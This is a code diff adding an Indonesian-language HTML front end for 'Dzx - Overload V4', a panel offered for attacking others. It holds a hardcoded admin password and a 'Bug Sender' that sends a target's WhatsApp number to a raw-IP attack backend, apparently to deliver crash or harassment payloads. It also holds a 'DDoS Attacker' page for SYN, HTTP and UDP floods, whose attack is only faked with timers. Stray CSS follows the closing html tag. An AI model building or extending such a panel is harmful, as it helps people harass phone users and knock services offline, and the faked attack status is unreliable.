@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RDVSP V4 - Beta Test</title>
+    <title>Dzx - Overload - Beta Test</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
     <style>
@@ -71,6 +71,1122 @@
             text-shadow: 0 0 10px rgba(156, 39, 176, 0.5);
         }
         
+        .login-container .logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 1em;
+            filter: drop-shadow(0 0 10px var(--main));
+        }
+        
+        .input-group {
+            margin-bottom: 1.5em;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5em;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 1em;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 1em;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--main);
+            box-shadow: 0 0 8px var(--main);
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 1em;
+            background: var(--main);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+            position: relative;
+        }
+        
+        .btn-primary:hover {
+            background: var(--second);
+            transform: translateY(-2px);
+        }
+        
+        .btn-primary:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .login-result {
+            margin-top: 1.5em;
+            font-size: 0.9em;
+            font-weight: bold;
+            text-align: center;
+            display: none;
+            padding: 0.8em;
+            border-radius: 5px;
+        }
+        
+        .login-result.login-success {
+            color: #4CAF50;
+            background: rgba(76, 175, 80, 0.1);
+        }
+        
+        .login-result.login-error {
+            color: crimson;
+            background: rgba(220, 20, 60, 0.1);
+        }
+        
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            width: 1em;
+            height: 1em;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 0.5em;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        #login-page {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        #app-container {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            min-height: 100vh;
+        }
+        
+        header {
+            background-color: var(--second);
+            padding: 1.5em;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 10;
+        }
+        
+        header .logo-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        header .logo-container .logo {
+            width: 50px;
+            height: 50px;
+            margin-right: 1em;
+            filter: none;
+        }
+        
+        header h1 {
+            font-size: 1.5em;
+            margin: 0;
+            color: var(--text);
+        }
+        
+        .profile-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .profile-info span {
+            margin-right: 1em;
+            font-size: 1.1em;
+            color: var(--text);
+        }
+        
+        .profile-info .btn-logout {
+            padding: 0.5em 1em;
+            background-color: crimson;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .profile-info .btn-logout:hover {
+            background-color: #a00;
+        }
+        
+        nav {
+            background-color: var(--bg);
+            border-bottom: 1px solid var(--card-border);
+            padding: 1em 0;
+            display: flex;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .nav-item {
+            padding: 0.8em 1.5em;
+            cursor: pointer;
+            position: relative;
+            transition: color 0.3s;
+        }
+        
+        .nav-item:hover {
+            color: var(--main);
+        }
+        
+        .nav-item.active {
+            color: var(--main);
+            font-weight: bold;
+        }
+        
+        .nav-item.active::after {
+            content: '';
+            display: block;
+            width: 100%;
+            height: 2px;
+            background-color: var(--main);
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+        }
+        
+        main {
+            padding: 2em;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+            padding: 2em 0;
+            flex-grow: 1;
+        }
+        
+        .page.active {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        h2 {
+            color: var(--main);
+            text-align: center;
+            margin-bottom: 1em;
+            text-shadow: 0 0 5px rgba(156, 39, 176, 0.5);
+        }
+        
+        .info-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 12px;
+            padding: 2em;
+            margin-bottom: 2em;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+        }
+        
+        .info-card h3 {
+            font-size: 1.5em;
+            color: var(--main);
+            margin-bottom: 0.5em;
+        }
+        
+        .info-card p {
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 1.5em;
+            flex-wrap: wrap;
+        }
+        
+        .btn-telegram {
+            padding: 1em 2em;
+            background: #0088cc;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-decoration: none;
+        }
+        
+        .btn-telegram:hover {
+            background: #006699;
+        }
+        
+        .bug-section, .ddos-section, .account-section, .terminal-section {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 12px;
+            padding: 2em;
+            margin-bottom: 2em;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        .bug-selection {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1em;
+            margin-top: 1.5em;
+        }
+        
+        .bug-card, .ddos-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 10px;
+            padding: 1.5em;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.3s;
+            width: 150px;
+            text-align: center;
+        }
+        
+        .bug-card:hover, .ddos-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
+        }
+        
+        .bug-card.active, .ddos-card.active {
+            border: 2px solid var(--main);
+            box-shadow: 0 0 12px var(--main);
+        }
+        
+        .bug-card i, .ddos-card i {
+            font-size: 2.5em;
+            color: var(--main);
+            margin-bottom: 0.5em;
+        }
+        
+        .bug-card h4, .ddos-card h4 {
+            font-size: 1.1em;
+        }
+        
+        .form-group {
+            margin-top: 1.5em;
+        }
+        
+        .form-group input, .form-group select {
+            width: 80%;
+            max-width: 300px;
+            padding: 0.8em;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 8px;
+            color: var(--text);
+            margin-top: 0.5em;
+        }
+        
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: var(--main);
+            box-shadow: 0 0 8px var(--main);
+        }
+        
+        .form-group button {
+            width: 80%;
+            max-width: 300px;
+            margin-top: 1em;
+            padding: 0.8em;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .form-group button:hover {
+            background-color: #218838;
+        }
+        
+        .ddos-options {
+            display: flex;
+            justify-content: center;
+            gap: 1em;
+            flex-wrap: wrap;
+            margin-top: 1em;
+        }
+        
+        .ddos-input-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 1em;
+        }
+        
+        .ddos-input-group label {
+            font-size: 0.9em;
+            margin-bottom: 0.5em;
+        }
+        
+        .ddos-input-group input {
+            width: 100px;
+            text-align: center;
+        }
+        
+        .terminal-container {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid var(--main);
+            border-radius: 10px;
+            padding: 1em;
+            margin-top: 1em;
+            display: flex;
+            flex-direction: column;
+            height: 400px;
+            flex-grow: 1;
+        }
+        
+        #terminal-output {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            padding: 0.5em;
+            flex-grow: 1;
+            overflow-y: auto;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            text-align: left;
+            margin-bottom: 1em;
+        }
+        
+        .terminal-line {
+            margin-bottom: 0.2em;
+        }
+        
+        .terminal-input-container {
+            display: flex;
+        }
+        
+        #command-input {
+            background: #222;
+            border: none;
+            color: #fff;
+            flex-grow: 1;
+            padding: 0.8em;
+            border-radius: 5px;
+        }
+        
+        .terminal-input-container button {
+            background: var(--main);
+            color: #fff;
+            border: none;
+            padding: 0.8em 1.5em;
+            border-radius: 5px;
+            margin-left: 0.5em;
+            cursor: pointer;
+        }
+        
+        #notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 1em;
+            border-radius: 5px;
+            display: none;
+            z-index: 100;
+        }
+        
+        #popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .popup-content {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 15px;
+            padding: 2em;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        
+        .popup-content h3 {
+            color: var(--main);
+            margin-bottom: 1em;
+        }
+        
+        .popup-content button {
+            margin-top: 1em;
+            padding: 0.8em 1.5em;
+            background: var(--main);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+</head>
+<body>
+
+    <div id="particles-js"></div>
+
+    <div id="login-page">
+        <div class="login-container">
+            <img src="https://telegra.ph/file/ed1b46a9e144a1e9411d3.png" alt="Logo" class="logo">
+            <h2>Login Dulu Mel</h2>
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="Masukkan Username">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Masukkan Password">
+            </div>
+            <button class="btn-primary" onclick="handleLogin()">Login</button>
+            <div id="login-result" class="login-result"></div>
+        </div>
+    </div>
+
+    <div id="app-container">
+        <header>
+            <div class="logo-container">
+                <img src="https://telegra.ph/file/ed1b46a9e144a1e9411d3.png" alt="Logo" class="logo">
+                <h1>Dzx - Overload V4 BETA</h1>
+            </div>
+            <div class="profile-info">
+                <span>Hello, <span id="header-username"></span></span>
+                <button class="btn-logout" onclick="logout()">Logout</button>
+            </div>
+        </header>
+
+        <nav>
+            <div class="nav-item active" onclick="showPage('home-page')">HOME</div>
+            <div class="nav-item" onclick="showPage('bug-page')">BUG SENDER</div>
+            <div class="nav-item" onclick="showPage('ddos-page')">DDoS Attacker</div>
+            <div class="nav-item" onclick="showPage('account-page')">ACCOUNT</div>
+        </nav>
+
+        <main>
+            <div id="home-page" class="page active">
+                <h2>Selamat Datang di Dzx - Overload V4 Beta</h2>
+                <div class="info-card">
+                    <h3>Status Sistem</h3>
+                    <p>Waktu Server: <span id="current-time"></span> WIB</p>
+                    <p>Total Pengguna Aktif: 7</p>
+                    <p>Version: Beta v1.0.0</p>
+                </div>
+                <div class="info-card">
+                    <h3>Tentang Dzx - Overload V4</h3>
+                    <p>Dzx - Overload V4 adalah tool terintegrasi untuk berbagai kebutuhan, mulai dari mengirim bug hingga serangan DDoS. Versi ini masih dalam tahap beta.</p>
+                </div>
+                <div class="button-group">
+                    <button class="btn-telegram" onclick="openTelegram()"><i class="fab fa-telegram-plane"></i> Join Telegram Channel</button>
+                    <button class="btn-primary" onclick="showPage('bug-page')"><i class="fas fa-bug"></i> Bug Sender</button>
+                    <button class="btn-primary" onclick="showPage('ddos-page')"><i class="fas fa-hammer"></i> DDoS Attacker</button>
+                </div>
+            </div>
+
+            <div id="bug-page" class="page">
+                <div class="bug-section">
+                    <h2>BUG SENDER</h2>
+                    <p>Pilih jenis bug yang ingin dikirim dan masukkan nomor WhatsApp target.</p>
+                    <div class="form-group">
+                        <label for="bug-select">Pilih Bug:</label>
+                        <select id="bug-select">
+                            <option value="call">Call</option>
+                            <option value="typing">Typing</option>
+                            <option value="recording">Recording</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="target-number">Nomor WhatsApp Target:</label>
+                        <input type="text" id="target-number" placeholder="Contoh: 6281234567890">
+                    </div>
+                    <button id="send-bug-btn" onclick="sendBug()">Kirim Bug</button>
+                    <p id="bug-result"></p>
+                </div>
+            </div>
+
+            <div id="ddos-page" class="page">
+                <div class="ddos-section">
+                    <h2>DDoS ATTACKER</h2>
+                    <p>Pilih metode serangan dan konfigurasi target.</p>
+                    <div class="ddos-options">
+                        <div class="ddos-card active" onclick="selectDDoSMethod('syn')">
+                            <i class="fas fa-sync-alt"></i>
+                            <h4>SYN Flood</h4>
+                        </div>
+                        <div class="ddos-card" onclick="selectDDoSMethod('http')">
+                            <i class="fas fa-globe"></i>
+                            <h4>HTTP Flood</h4>
+                        </div>
+                        <div class="ddos-card" onclick="selectDDoSMethod('udp')">
+                            <i class="fas fa-network-wired"></i>
+                            <h4>UDP Flood</h4>
+                        </div>
+                    </div>
+                    <div class="ddos-input-group">
+                        <label for="ddos-target-url">Target URL/IP:</label>
+                        <input type="text" id="ddos-target-url" placeholder="Contoh: example.com">
+                    </div>
+                    <div class="ddos-input-group">
+                        <label for="ddos-duration">Durasi (detik):</label>
+                        <input type="number" id="ddos-duration" value="60">
+                    </div>
+                    <div class="ddos-input-group">
+                        <label for="ddos-threads">Threads:</label>
+                        <input type="number" id="ddos-threads" value="100">
+                    </div>
+                    <div class="ddos-input-group">
+                        <label for="ddos-rps">Requests per detik:</label>
+                        <input type="number" id="ddos-rps" value="5000">
+                    </div>
+                    <button id="start-ddos-btn" onclick="startDDoS()">Mulai Serangan</button>
+                    <p id="ddos-result" style="color: #4caf50; margin-top: 10px;"></p>
+                </div>
+            </div>
+
+            <div id="account-page" class="page">
+                <div class="account-section">
+                    <h2>AKUN SAYA</h2>
+                    <div class="info-card">
+                        <h3>Informasi Akun</h3>
+                        <p>Username: <span id="account-username"></span></p>
+                        <p>Role: <span id="account-role"></span></p>
+                        <p>Kadaluarsa: <span id="account-expiry"></span></p>
+                    </div>
+                    <div class="button-group">
+                        <button class="btn-primary" onclick="toggleAccountForm('change-password')">Ubah Password</button>
+                        <button class="btn-primary" onclick="toggleAccountForm('change-username')">Ubah Username</button>
+                        <button class="btn-primary" onclick="toggleAccountForm('extend-expiry')">Perpanjang Expired</button>
+                        <button class="btn-primary" onclick="toggleAccountForm('')">Sembunyikan Formulir</button>
+                    </div>
+
+                    <div id="change-password-form" class="account-form form-group">
+                        <h3>Ubah Password</h3>
+                        <input type="password" id="new-password" placeholder="Password Baru">
+                        <input type="password" id="confirm-password" placeholder="Konfirmasi Password Baru">
+                        <button onclick="changePassword()">Simpan</button>
+                    </div>
+
+                    <div id="change-username-form" class="account-form form-group">
+                        <h3>Ubah Username</h3>
+                        <input type="text" id="current-username" placeholder="Username Saat Ini">
+                        <input type="text" id="new-username" placeholder="Username Baru">
+                        <button onclick="changeUsername()">Simpan</button>
+                    </div>
+
+                    <div id="extend-expiry-form" class="account-form form-group">
+                        <h3>Perpanjang Akun</h3>
+                        <input type="date" id="new-expiry">
+                        <button onclick="extendExpiry()">Simpan</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div id="notification"></div>
+
+    <div id="popup">
+        <div class="popup-content">
+            <h3 id="popup-message"></h3>
+            <button onclick="closePopup()">OK</button>
+        </div>
+    </div>
+    
+    <script>
+        // Data akun disimpan di sini sebagai array of objects
+        const accounts = [
+            { username: "dayzx", password: "dayzx-25", role: "ADMIN", expiry: "2026-12-31" }
+        ];
+
+        // Inisialisasi particles.js
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 60, density: { enable: true, value_area: 800 }},
+                color: { value: "#ffffff" },
+                shape: { type: "circle" },
+                opacity: { value: 0.4 },
+                size: { value: 3, random: true },
+                line_linked: {
+                    enable: true, distance: 150,
+                    color: "#ffffff", opacity: 0.3, width: 1
+                },
+                move: { enable: true, speed: 2, direction: "none", random: false }
+            },
+            interactivity: {
+                events: {
+                    onhover: { enable: true, mode: "grab" },
+                    onclick: { enable: false }
+                },
+                modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
+            },
+            retina_detect: true
+        });
+        
+        // Perbarui waktu saat ini
+        function updateTime() {
+            const now = new Date();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            document.getElementById('current-time').textContent = `${hours}:${minutes}`;
+        }
+        
+        updateTime();
+        setInterval(updateTime, 60000);
+        
+        // Manajemen sesi
+        function saveSession(user) {
+            sessionStorage.setItem("currentUser", JSON.stringify(user));
+        }
+        
+        function getSession() {
+            return JSON.parse(sessionStorage.getItem("currentUser"));
+        }
+        
+        function logout() {
+            sessionStorage.removeItem("currentUser");
+            location.reload();
+        }
+        
+        // Periksa apakah pengguna sudah login saat halaman dimuat
+        window.onload = function() {
+            const user = getSession();
+            if (user) {
+                showApp(user);
+                showPage('home-page');
+            }
+            
+            // Inisialisasi tema
+            const themeToggle = document.getElementById('theme-toggle');
+            if (themeToggle) {
+                themeToggle.addEventListener('change', function() {
+                    if (this.checked) {
+                        document.body.classList.remove('light-mode');
+                        localStorage.setItem('theme', 'dark');
+                    } else {
+                        document.body.classList.add('light-mode');
+                        localStorage.setItem('theme', 'light');
+                    }
+                });
+                
+                // Periksa tema yang tersimpan
+                const savedTheme = localStorage.getItem('theme');
+                if (savedTheme === 'light') {
+                    document.body.classList.add('light-mode');
+                    themeToggle.checked = false;
+                }
+            }
+        };
+        
+        // Fungsi untuk memeriksa kedaluwarsa akun
+        function checkExpiry(user) {
+            if (!user.expiry) return true;
+            const expiryDate = new Date(user.expiry);
+            const today = new Date();
+            return today <= expiryDate;
+        }
+        
+        // Fungsi login yang telah diubah
+        async function handleLogin() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const resultDiv = document.getElementById('login-result');
+            
+            resultDiv.className = 'login-result';
+            resultDiv.style.display = 'none';
+            
+            if (!username || !password) {
+                showLoginError("Username dan Password harus diisi!");
+                return;
+            }
+            
+            const loginBtn = document.querySelector('.btn-primary');
+            const originalBtnHTML = loginBtn.innerHTML;
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<span class="spinner"></span> Memproses...';
+            
+            // Mencari pengguna di array accounts
+            const foundUser = accounts.find(u => u.username === username && u.password === password);
+            
+            if (foundUser) {
+                if (checkExpiry(foundUser)) {
+                    showLoginSuccess("Login berhasil! Mengalihkan...");
+                    setTimeout(() => {
+                        saveSession(foundUser);
+                        showApp(foundUser);
+                        showPage('home-page');
+                        loginBtn.disabled = false;
+                        loginBtn.innerHTML = originalBtnHTML;
+                    }, 1500);
+                } else {
+                    showLoginError("❌ Akun Anda sudah kedaluwarsa. Silakan perbarui.");
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = originalBtnHTML;
+                }
+            } else {
+                showLoginError("❌ Username atau Password salah!");
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = originalBtnHTML;
+            }
+        }
+        
+        // Tampilkan pesan error login
+        function showLoginError(message) {
+            const resultDiv = document.getElementById('login-result');
+            resultDiv.textContent = message;
+            resultDiv.className = 'login-result login-error';
+            resultDiv.style.display = 'block';
+        }
+        
+        // Tampilkan pesan sukses login
+        function showLoginSuccess(message) {
+            const resultDiv = document.getElementById('login-result');
+            resultDiv.textContent = message;
+            resultDiv.className = 'login-result login-success';
+            resultDiv.style.display = 'block';
+        }
+        
+        // Tampilkan aplikasi utama setelah login
+        function showApp(user) {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('app-container').style.display = 'flex';
+            document.getElementById('header-username').innerText = user.username;
+            
+            // Update user info in account page
+            document.getElementById('account-username').innerText = user.username;
+            document.getElementById('account-role').innerText = user.role;
+            document.getElementById('account-expiry').innerText = user.expiry || 'N/A';
+            
+            // Update user role in bug page
+            const userRoleElements = document.querySelectorAll('.user-role');
+            userRoleElements.forEach(element => {
+                element.textContent = `Role: ${user.role}`;
+            });
+        }
+        
+        // Tampilkan halaman
+        function showPage(pageId) {
+            // Sembunyikan semua halaman
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Tampilkan halaman yang dipilih
+            document.getElementById(pageId).classList.add('active');
+            
+            // Perbarui item navigasi yang aktif
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            // Temukan dan aktifkan item navigasi yang sesuai
+            const navItems = document.querySelectorAll('.nav-item');
+            if (pageId === 'home-page') navItems[0].classList.add('active');
+            else if (pageId === 'bug-page') navItems[1].classList.add('active');
+            else if (pageId === 'ddos-page') navItems[2].classList.add('active');
+            else if (pageId === 'account-page') navItems[3].classList.add('active');
+        }
+        
+        // Buka Telegram
+        function openTelegram() {
+            showNotification('Membuka channel Telegram...');
+            setTimeout(() => {
+                window.open('https://t.me/DayzxTech', '_blank');
+            }, 1000);
+        }
+        
+        // Pengiriman bug
+        async function sendBug() {
+            const input = document.getElementById('target-number').value.trim();
+            const selectedBug = document.getElementById('bug-select').value;
+            const resDiv = document.getElementById('bug-result');
+            const btn = document.getElementById('send-bug-btn');
+            
+            // Validasi format nomor telepon
+            if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
+                resDiv.innerText = "Masukkan nomor WA yang valid!";
+                resDiv.style.color = "crimson";
+                return;
+            }
+            
+            // Format chatId
+            const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
+            
+            // Tampilkan status loading
+            btn.disabled = true;
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<span class="spinner"></span> Mengirim...';
+            resDiv.innerText = "";
+            
+            try {
+                // Lakukan panggilan API untuk mengirim bug
+                const res = await fetch(`http://178.128.99.122:2054/evolution?type=${selectedBug}&chatId=${encodeURIComponent(chatId)}`);
+                const json = await res.json();
+                
+                // Tampilkan popup sukses
+                showPopup(`Bug berhasil dikirim ke <b>${input}</b>`);
+            } catch (err) {
+                // Tampilkan pesan error
+                resDiv.innerText = "❌ Gagal mengirim bug: " + err;
+                resDiv.style.color = "crimson";
+            }
+            
+            // Reset status tombol
+            btn.disabled = false;
+            btn.innerHTML = originalHTML;
+        }
+        
+        // Pemilihan metode DDoS
+        let selectedDDoSMethod = "syn";
+        
+        function selectDDoSMethod(method) {
+            selectedDDoSMethod = method;
+            
+            // Perbarui UI untuk menampilkan metode yang dipilih
+            document.querySelectorAll(".ddos-card").forEach(card => {
+                card.classList.remove("active");
+            });
+            
+            event.currentTarget.classList.add("active");
+        }
+        
+        // Memulai serangan DDoS
+        async function startDDoS() {
+            const target = document.getElementById('ddos-target-url').value.trim();
+            const duration = document.getElementById('ddos-duration').value;
+            const threads = document.getElementById('ddos-threads').value;
+            const rps = document.getElementById('ddos-rps').value;
+            const resDiv = document.getElementById('ddos-result');
+            const btn = document.getElementById('start-ddos-btn');
+            
+            if (!target) {
+                resDiv.innerText = "❌ Masukkan target URL/IP!";
+                resDiv.style.color = "crimson";
+                return;
+            }
+            
+            btn.disabled = true;
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<span class="spinner"></span> Starting Attack...';
+            resDiv.innerText = "";
+            
+            try {
+                // Simulasi serangan DDoS
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Tampilkan status serangan
+                let secondsRemaining = parseInt(duration);
+                const attackInterval = setInterval(() => {
+                    resDiv.innerHTML = `
+                        <div class="ddos-status">
+                            <h3>Attack Status</h3>
+                            <div class="status-item">
+                                <span>Target:</span>
+                                <span>${target}</span>
+                            </div>
+                            <div class="status-item">
+                                <span>Method:</span>
+                                <span>${selectedDDoSMethod.toUpperCase()}</span>
+                            </div>
+                            <div class="status-item">
+                                <span>Time Remaining:</span>
+                                <span class="status-value">${secondsRemaining}s</span>
+                            </div>
+                            <div class="status-item">
+                                <span>Threads:</span>
+                                <span>${threads}</span>
+                            </div>
+                            <div class="status-item">
+                                <span>Requests/s:</span>
+                                <span>${rps}</span>
+                            </div>
+                        </div>
+                    `;
+                    
+                    secondsRemaining--;
+                    
+                    if (secondsRemaining < 0) {
+                        clearInterval(attackInterval);
+                        resDiv.innerHTML = `<div style="color: #0f0; text-align: center; margin-top: 10px;">✅ Attack completed successfully!</div>`;
+                        btn.disabled = false;
+                        btn.innerHTML = originalHTML;
+                    }
+                }, 1000);
+                
+                showPopup(`DDoS attack started on <b>${target}</b> using ${selectedDDoSMethod.toUpperCase()} method`);
+            } catch (err) {
+                resDiv.innerText = "❌ Gagal memulai serangan: " + err.message;
+                resDiv.style.color = "crimson";
+                btn.disabled = false;
+                btn.innerHTML = originalHTML;
+            }
+        }
+        
+        // Toggle formulir akun
+        function toggleAccountForm(formId) {
+            // Sembunyikan semua formulir
+            document.querySelectorAll('.account-form').forEach(form => {
+                form.style.display = 'none';
+            });
+            
+            // Tampilkan formulir yang dipilih
+            if (formId) {
+                const form = document.getElementById(`${formId}-form`);
+                if (form) {
+                    form.style.display = 'block';
+                }
+            }
+        }
+        
+        // Ubah password
+        function changePassword() {
+            // Fungsi ini membutuhkan backend untuk berfungsi dengan benar
+            showNotification("⚠️ Fitur ini membutuhkan backend server.");
+        }
+        
+        // Ubah username
+        function changeUsername() {
+            // Fungsi ini membutuhkan backend untuk berfungsi dengan benar
+            showNotification("⚠️ Fitur ini membutuhkan backend server.");
+        }
+        
+        // Perpanjang tanggal kedaluwarsa
+        function extendExpiry() {
+            // Fungsi ini membutuhkan backend untuk berfungsi dengan benar
+            showNotification("⚠️ Fitur ini membutuhkan backend server.");
+        }
+        
+        // Jalankan perintah
+        function executeCommand() {
+            const commandInput = document.getElementById('command-input');
+            const command = commandInput.value.trim();
+            
+            if (!command) return;
+            
+            const terminalOutput = document.getElementById('terminal-output');
+            
+            // Tambahkan perintah ke terminal
+            const commandLine = document.createElement('div');
+            commandLine.className = 'terminal-line';
+            commandLine.textContent = `$ ${command}`;
+            terminalOutput.appendChild(commandLine);
+            
+            // Proses perintah
+            let output = '';
+            
+            if (command === 'help') {
+                output = 'Available commands:\n- help: Show this help message\n- clear: Clear terminal\n- version: Show app version\n- status: Show server status\n- users: Show online users';
+            } else if (command === 'clear') {
+                terminalOutput.innerHTML = '';
+                commandInput.value = '';
+                return;
+            } else if (command === 'version') {
+                output = 'RDVSP V4 Beta v1.0.0';
+            } else if (command === 'status') {
+                output = 'Server Status: Online\nUsers: 7\nActive Senders: 0';
+            } else if (command === 'users') {
+                output = 'Online Users:\n- kyleetzyy (RESELLER)\n- user1 (USER)\n- user2 (USER)\n- admin (ADMIN)\n- user3 (USER)\n- user4 (USER)\n- user5 (USER)';
+            } else {
+                output = `Command not found: ${command}\nType 'help' for available commands`;
+            }
+            
+            // Tambahkan output ke terminal
+            const outputLine = document.createElement('div');
+            outputLine.className = 'terminal-line';
+            outputLine.textContent = output;
+            terminalOutput.appendChild(outputLine);
+            
+            // Gulir ke bawah
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+            
+            // Bersihkan input
+            commandInput.value = '';
+        }
+        
+        // Hubungi pengembang
+        function contactDeveloper() {
+            showNotification('Membuka formulir kontak...');
+            // Dalam aplikasi nyata, ini akan membuka formulir kontak atau klien email
+            setTimeout(() => {
+                showNotification('Pesan berhasil dikirim ke pengembang!');
+            }, 1500);
+        }
+        
+        // Tampilkan notifikasi
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Tampilkan popup
+        function showPopup(message) {
+            document.getElementById("popup-message").innerHTML = message;
+            document.getElementById("popup").style.display = "flex";
+        }
+        
+        // Tutup popup
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+        
+        // Tangani tombol Enter di terminal
+        document.getElementById('command-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeCommand();
+            }
+        });
+        
+        // Tangani tombol Enter di formulir login
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+    </script>
+</body>
+</html>        
         .login-container .logo {
             width: 100px;
             height: 100px;
